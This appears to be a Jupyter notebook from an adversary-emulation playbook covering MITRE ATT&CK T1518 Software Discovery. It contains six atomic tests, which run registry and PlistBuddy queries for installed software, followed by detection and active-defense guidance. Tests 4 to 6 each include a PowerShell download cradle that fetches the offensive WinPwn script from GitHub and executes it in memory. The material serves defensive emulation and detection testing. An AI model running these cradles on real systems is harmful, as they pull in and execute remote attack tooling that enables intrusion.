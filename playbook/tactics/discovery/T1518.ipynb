{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "14e31a38",
   "metadata": {},
   "source": "# T1518 - Software Discovery\nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)."
  },
  {
   "cell_type": "markdown",
   "id": "4026ab33",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7c04bae9",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Find and Display Internet Explorer Browser Version",
    "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0c64c5c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2b7b0105",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Applications Installed",
    "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e518cc3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "1c4aa349",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Find and Display Safari Browser Version",
    "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb77c6d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "a559ad2b",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WinPwn - Dotnetsearch",
    "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74cdc399",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "3a60d8f3",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - WinPwn - DotNet",
    "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab9428a7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "20d99c6c",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - powerSQL",
    "Start PowerUpSQL Checks using powerSQL function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0e76ff0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1518 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "8158ccef",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  },
  {
   "cell_type": "markdown",
   "id": "e99bec5b",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Application Diversity \n Present the adversary with a variety of installed applications and services. \n\n Application diversity is presenting multiple software targets to the adversary. On a single target system, defenders can configure multiple different services or user software applications.  On a target network, defenders can present systems with a variety of operating systems, operating system versions, applications, and services.\n#### Opportunity\nThere is an opportunity to provide a variety of applications to an adversary to see what things an adversary prefers or to influence their operations.\n#### Use Case\nA defender can install an array of various software packages on a system to make it look used and populated. This will give an adversary a collection of software to interact with and possibly expose additional techniques.\n#### Procedures\nUse a mix of vulnerable and nonvulnerable software on a system to allow you to see what exploits the adversary leverages in their attacks.\nInstall Anti-virus or other end-point detection tools on systems to see if an adversary takes note of them and if so, how they react.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}